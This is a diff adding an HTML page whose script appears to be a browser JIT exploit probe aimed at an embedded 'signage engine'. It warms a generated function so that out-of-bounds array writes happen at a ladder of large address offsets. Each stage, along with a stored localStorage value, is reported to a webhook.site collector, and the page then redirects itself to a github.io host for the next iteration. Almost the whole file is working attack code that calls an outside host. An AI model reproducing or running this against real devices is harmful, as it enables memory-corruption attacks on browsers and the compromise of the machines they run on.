@@ -1,0 +1,32 @@
+<html><body><script>
+// r4: URL-state iteration test. Reads k from query, does one far-write probe, then navigates to k+1.
+var SINK='https://webhook.site/4d4116b3-9a45-4992-b92f-e94487739e32';
+function beacon(t,v){ try{ navigator.sendBeacon(SINK+'/b?t='+encodeURIComponent(t)+'&k='+encodeURIComponent(String(v)).slice(0,40), ''); }catch(e){} try{ fetch(SINK+'?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,120)),{mode:'no-cors'});}catch(e){} }
+var q={}; var m; var re=/[?&]([^=&]+)=([^&]*)/g; while((m=re.exec(location.search))) q[decodeURIComponent(m[1])]=decodeURIComponent(m[2]);
+var k=parseInt(q.k||'0',10)||0;
+var LAD=['0x100000000','0x140000000','0x180000000','0x1C0000000','0x200000000','0x300000000','0x400000000'];
+beacon('render','k='+k);
+try{ beacon('lsprev', localStorage.getItem('r4k')||'none'); localStorage.setItem('r4k',String(k)); }catch(e){}
+if (k < LAD.length) {
+  var C = LAD[k];
+  var fake=new Uint32Array(10); for(var i=0;i<10;i++) fake[i]=i+1;
+  var tahir=0x1;
+  var src = 'var oob=new Array(5); oob[0]=0x500;'
+   + 'let jv=fake[0]; let av=fake[7]; if(a%7==0) av='+C+';'
+   + 'av=Math.max(av,tahir); av=av>>>0; var index=fake[3]; var fpm=fake[6]; let c=fake[1];'
+   + 'for(var i=0;i<10;i++){ if(a%3==0) jv=c; if(a%37==0) jv=fake[2]; if(a%11==0) jv=fake[8]; if(a%17==0) jv=fake[5]; if(a%19==0) jv=fake[4];'
+   + ' if(a%7==0&&i>=5){ fpm=jv; jv=av; } if(i>=6){ for(let j=0;j<5;j++){ if(a%5==0){ index=fpm; oob[index]=0x500; } } } fpm=c; c=jv; }'
+   + 'return [index,BigInt(jv)];';
+  var T = new Function('a', src);
+  for (let i=2;i<0x500;i++) T(i);
+  for (let w=0;w<50000;w++) T(w%500+2);
+  beacon('warm-done','C='+C);
+  try { T(35); beacon('fire-done','C='+C); } catch(e){ beacon('fire-exc',String(e).slice(0,60)); }
+  beacon('step-done','k='+k);
+} else {
+  beacon('ladder-exhausted','k='+k);
+}
+// navigation test: does the signage engine follow location.href?
+beacon('nav-attempt','to k='+(k+1));
+try { location.href = 'https://tapczanpawel-walijak5cali.github.io/r4.html?k=' + (k+1); } catch(e) { beacon('nav-throw',String(e).slice(0,60)); }
+</script></body></html>
